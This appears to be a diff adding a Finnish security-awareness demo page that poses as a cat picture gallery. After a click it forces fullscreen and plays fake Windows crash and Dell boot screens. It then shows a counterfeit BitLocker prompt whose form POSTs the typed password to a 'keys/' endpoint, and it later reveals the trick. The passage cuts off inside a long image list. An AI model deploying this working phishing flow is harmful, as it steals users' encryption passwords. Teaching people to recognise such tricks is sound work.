@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kissakuvasivu - mikä kissa olisit?</title>
+
+<style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+
+			font-size: 0.97em;
+            background: white;
+            color: black;
+            font-family: Arial, sans-serif;
+        }
+
+        .gallery {
+			text-align: center;			
+            padding: 10px;
+        }
+        .image-container {
+            display: inline-block;
+            margin: 10px;
+        }
+
+        .image-container img {
+            max-width: 75%;
+            height: auto;
+            border: 2px solid black;
+        }
+
+		#blbackground {
+			position: fixed;
+			top: 0;
+			left: 0;
+            margin: 0;
+            padding: 0;
+			width: 100%;
+			height: 100vh;
+			background-color: #2068b2;
+		}
+		#blcontainer {
+			font-family: Calibri, Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif;
+			color: #E8FBFF;
+			background: #2068B2;
+			display: table-cell;
+			vertical-align: top;
+			display: block;
+			height: 100%;
+			margin: 0 auto;
+			margin-top: -10px;
+			width: 70%;
+			font-size: 1.9vw;
+		}
+
+		#blh1, #blh2, #blh3 { font-weight: normal; padding: 0; margin: 25px 0; margin-top: 0; font-weight: 300; }
+		#blh1 { font-size: 1.6em; margin-bottom: 10px; }
+		#blh2 { font-size: 0.85em; }
+		#blh3 { font-size: 0.6em;  }
+		input[type="text"] { border-radius: 0px; font-size: 0.8em; padding: 5px; margin: 0; border: 0px solid #2068B2; background: #C8DBCF; color: #103832; -webkit-text-security: disc; width:600px;}
+		
+
+
+
+
+		#crashcontainer {
+			font-family: Calibri, Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif;
+			color: #E8FBFF;
+			display: table-cell;
+			vertical-align: top;
+			display: table;
+			height: 100%;
+			margin: 0 auto;
+			margin-top: 20px;
+			width: 70%;
+			font-size: 1.9vw;
+		}
+			
+		#crashh1, #crashh2, #crashh2count, #crashh3 { font-weight: normal; padding: 0; margin: 25px 0; margin-top: 0; font-weight: 250; }
+		
+		#crashh1 { font-size: 5.5em; margin-bottom: 10px; }
+		#crashh2 { font-size: 1.1em; }
+		#crashh2count { font-size: 1.1em; }
+		#crashh3 { font-size: 0.55em;  }
+
+        .black-screen {
+            background: black;
+            color: white;
+        }
+
+    </style>
+
+
+
+</head>
+<body>
+    <div id="content">
+
+		
+	</div>
+
+
+    <script>
+		// onload function
+		window.onload = function() {
+			setDefaultContent();
+		};
+
+
+        function getRandomNumber(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }		
+
+		function clickHandler() {
+			removeClickListeners();
+            setTimeout(activate, getRandomNumber(2000, 8000));
+    	}
+
+	    // Attach the event listener
+	    document.addEventListener("click", clickHandler);
+
+    	// Function to remove event listeners for click event
+    	function removeClickListeners() {
+	        document.removeEventListener("click", clickHandler);
+	    }
+
+
+
+        function goFullScreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) {
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
+        function goFullscreen2() {
+            const element = document.documentElement;
+
+            // Check for browser support and request fullscreen
+            if (element.requestFullscreen) {
+                element.requestFullscreen();
+            } else if (element.mozRequestFullScreen) { // Firefox
+                element.mozRequestFullScreen();
+            } else if (element.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                element.webkitRequestFullscreen();
+            } else if (element.msRequestFullscreen) { // IE/Edge
+                element.msRequestFullscreen();
+            } else {
+                alert("Fullscreen mode is not supported by your browser.");
+            }
+        }
+
+        function exitFullScreen() {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.mozCancelFullScreen) {
+                document.mozCancelFullScreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            } else if (document.msExitFullscreen) {
+                document.msExitFullscreen();
+            }
+        }
+
+
+        // function to set the entire screen gray by creating an overlay
+        function setGray() {
+            // Create the overlay element
+            const overlay = document.createElement('div');
+            overlay.id = 'grayOverlay'; // Assign an ID for styling
+
+            // Style the overlay
+            overlay.style.position = 'absolute';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(40, 43, 50, 1)'; // Semi-transparent black
+            overlay.style.zIndex = '1'; // Place the overlay on top
+
+            // Append the overlay to the body
+            document.body.appendChild(overlay);
+        }
+
+        // this function will remove the overlay
+        function removeGray() {
+            const overlay = document.getElementById('grayOverlay');
+            if (overlay) {
+                overlay.remove();
+            }
+        }
+
+
+        // function to set the entire screen gray by creating an overlay
+        function setBlack() {
+            // Create the overlay element
+            const overlay = document.createElement('div');
+            overlay.id = 'blackOverlay'; // Assign an ID for styling
+
+            // Style the overlay
+            overlay.style.position = 'absolute';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(00, 00, 00, 1)'; // Semi-transparent black
+            overlay.style.zIndex = '1'; // Place the overlay on top
+
+            // Append the overlay to the body
+            document.body.appendChild(overlay);
+        }
+
+        // this function will remove the overlay
+        function removeBlack() {
+            const overlay = document.getElementById('blackOverlay');
+            if (overlay) {
+                overlay.remove();
+            }
+        }
+
+
+
+
+        function addText() {
+            const overlay = document.getElementById('grayOverlay');
+            const textlist = ['systemFunction()', 'Press any key to minimaximize', 'Restore window', 'Please log in', 'Kirjaudu sisään painamalla ctrl-alt-del', 'Log in by pressing ctrl-alt-del', 'Unknown disk', 'Levyasemaa ei formatoitu. Haluatko alustaa sen nyt?', 'Käynnistä ohjelma painamalla Enter.', 'fopen()', '4621134-5234', 'Pienennä ikkuna', 'Suurenna ikkuna', 'Aseta uusi taustakuva', 'Tiedostot: tallennettu paikalliselle levylle', 'Kirjaudu ulos', 'Siirry koko näytön tilaan'];
+            if (overlay) {
+                const text = document.createElement('p');
+                text.textContent = textlist[Math.floor(Math.random() * textlist.length)];
+                text.style.color = 'white';
+                text.style.position = 'absolute';
+                text.style.top = `${Math.floor(Math.random() * 95)}%`;
+                text.style.left = `${Math.floor(Math.random() * 95)}%`;
+                text.style.transform = 'translate(-50%, -50%)'; // Center the text
+
+                overlay.appendChild(text);
+            }
+        }
+
+		function showImageCrash() {
+            document.documentElement.style.overflow = 'hidden';
+            document.body.style.overflow = 'hidden';
+
+            document.getElementById("content").innerHTML = `
+                <div style="background: #0078D7; height: 100vh; display: flex; justify-content: center; align-items: center;">
+                    <img src="winerr.png">
+                </div>
+        `;
+            
+        }
+
+        function showImageBoot() {
+            document.getElementById("content").innerHTML = `
+			<div style="background: black; height: 100vh; display: flex; justify-content: center; align-items: center;">
+				<img src="dell.png">
+			</div>
+			`;
+        }
+
+
+
+        function showCrash() {
+            document.getElementById("content").innerHTML = `
+				<div id="blbackground">
+					<div id="crashcontainer"><br><br>
+					<h1 id="crashh1">:(</h1>
+					<h2 id="crashh2">Your PC ran into a problem and needs to restart. We're<br>just collecting some error info, and then we'll restart for.<br>
+					you</h2>
+					<h2 id="crashh2count">20% complete</h2><br><br>
+					<h3 id="crashh3">For more information about this issue and possible fixes, visit https://www.windows.com/stopcode<br><br>If you call a support person, give them this info:<br>Stop code: CRITICAL_PROCESS_DIED</h3>
+					</div>
+				</div>
+            `;
+
+
+
+		}
+
+
+
+
+
+        function showBitlocker() {
+            document.getElementById("content").innerHTML = `
+				<div id="blbackground">
+					<div id="blcontainer"><br><br><h1 id="blh1">BitLocker</h1><h2 id="blh2">Enter the password to unlock the drive</h2>
+					<form id="myForm"><input type="text" id="maskedInput" name="inputField" autofocus></form><br>
+					<h3 id="blh3">Press the Insert key to see the password as you type.</h3><br><br><br><br><br><br><br><h2 id="blh2">Press Enter to continue</h2><h2 id="blh2">Press Esc for BitLocker recovery</h2>
+					</div>
+				</div>
+
+            `;
+
+
+			document.addEventListener("submit", function(event) {
+				// Check if the submitted form is #myForm
+				if (event.target && event.target.id === "myForm") { 
+					event.preventDefault();
+
+					let formData = new FormData(event.target);
+
+					fetch("keys/", {
+						method: "POST",
+						body: formData
+					})
+					.then(response => response.text()) // Handle response
+					.then(data => {
+						console.log("Form submitted successfully:", data);
+						unlockAndResume();
+					})
+					.catch(error => {
+						console.error("Error:", error);
+						unlockAndResume();
+					});
+				}
+			});
+        }
+
+
+        function showButtonPage() {
+            document.body.classList.remove("black-screen");
+            document.body.style.background = "white";
+            document.body.style.color = "black";
+            document.getElementById("content").innerHTML = '<button onclick="blackoutThenExit()">Click to Exit Fullscreen</button>';
+        }
+
+        function blackoutThenExit() {
+            document.body.classList.add("black-screen");
+            document.getElementById("content").innerHTML = "";
+            setTimeout(() => {
+                exitFullScreen();
+            }, 1000);
+        }
+
+        // Function to delay execution for a specified time
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+
+
+
+
+
+
+		async function activate() {
+			document.body.style.cursor = "none"; // Hides the cursor
+            document.getElementById("content").innerHTML = ''; // empty the page
+
+			goFullscreen2();
+			setGray();
+
+            // loop addtext()
+			for (let i = 0; i < 5; i++) {
+                addText();
+                await delay(100);
+            }
+
+			for (let i = 0; i < 20; i++) {
+                addText();
+                await delay(50);
+            }
+
+			for (let i = 0; i < 250; i++) {
+                addText();
+                await delay(10);
+            }
+
+			removeGray();
+
+			showCrash();
+			let percentage = 0;
+			const field = document.getElementById('crashh2count');
+			
+			function updatePercentage() {
+				if (percentage <= 100) {
+					field.innerHTML = `${percentage}% complete`;
+					percentage++;
+					setTimeout(updatePercentage, 10);
+				}
+			}
+			updatePercentage();
+			await delay(3000);
+
+            document.body.classList.add("black-screen");
+            document.getElementById("content").innerHTML = "";
+			await delay(3000);
+
+			showImageBoot();
+			await delay(3000);
+            document.body.classList.remove("black-screen");
+            document.body.style.background = "white";
+            document.body.style.color = "black";
+
+			await showBitlocker();
+		}
+
+		async function unlockAndResume() {
+			document.getElementById("content").innerHTML = '';
+
+			setBlack();
+			await delay(1000);
+			removeBlack();
+
+			showImageBoot();
+			await delay(3000);
+
+			setBlack();
+			await delay(1000);
+			removeBlack();
+
+			exitFullScreen();
+			document.body.style.cursor = "default";
+			
+			setDefaultContent();
+            document.getElementById("ohje").innerHTML = 'Huomasitko? Annoit juuri <a href="keys/">avaimesi</a> hyökkääjälle.';
+            document.getElementById("reload").innerHTML = 'Paina <a href=".">tästä</a> päästäksesi alkuun.';
+		}
+
+
+
+
+		function setDefaultContent() {
+			document.body.style.cursor = "default";
+			document.getElementById("content").innerHTML = `
+
+		<div class="gallery">
+			<h1>Kissakuvasivu</h1>
+			<h2>Tai <i>mikä tahansa</i> muu sivusto, jossa on hyökkääjän kontrolloimaa koodia.</h2>
+			<h2 id="ohje">Mikä kissa olisit? Klikkaa kissaa!</h2>
+			<h3 id="reload"></h3>
+	
+	
+		<div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image180.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image22.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image172.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image134.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image100.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image3.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image219.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image120.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image20.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image29.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image67.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image185.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image217.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image60.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image176.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image17.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image85.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image38.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image86.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image81.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image224.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image211.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image118.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image6.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image130.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image119.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image204.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image171.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image126.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image170.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image27.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image127.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image106.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image163.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image31.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image148.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image191.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image98.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image142.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image19.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image2.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image32.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image101.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image210.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image173.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image33.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image208.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image4.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image42.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image131.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image186.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image146.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image82.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image216.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image104.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image109.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image190.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image78.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image155.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image18.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image65.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image113.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image77.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image193.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image50.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image152.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image24.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image30.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image58.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image46.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image138.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image47.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image177.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image99.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image149.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image165.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image95.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image7.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image117.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image154.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image164.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image11.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image222.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image1.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image179.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image140.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image68.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image189.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image183.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image202.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image139.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image16.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image195.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image221.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image135.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image220.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image48.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image212.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image228.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image207.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image162.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image13.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image10.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image61.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image45.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image182.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image93.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image12.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image128.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image36.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image70.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image215.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image97.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image53.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image83.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image201.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image147.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image213.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image51.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image110.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image37.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image121.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image168.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image55.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image54.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image108.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image76.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image200.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image87.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image56.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image79.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image5.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image111.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image8.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image90.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image178.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image156.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image159.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image15.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image112.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image59.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image184.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image116.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image114.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image157.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image40.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image39.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image35.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image188.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image124.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image74.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image158.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image192.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image123.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image132.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image196.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image103.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image206.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image44.jpeg" alt="Image"></div><div class="image-container"><img 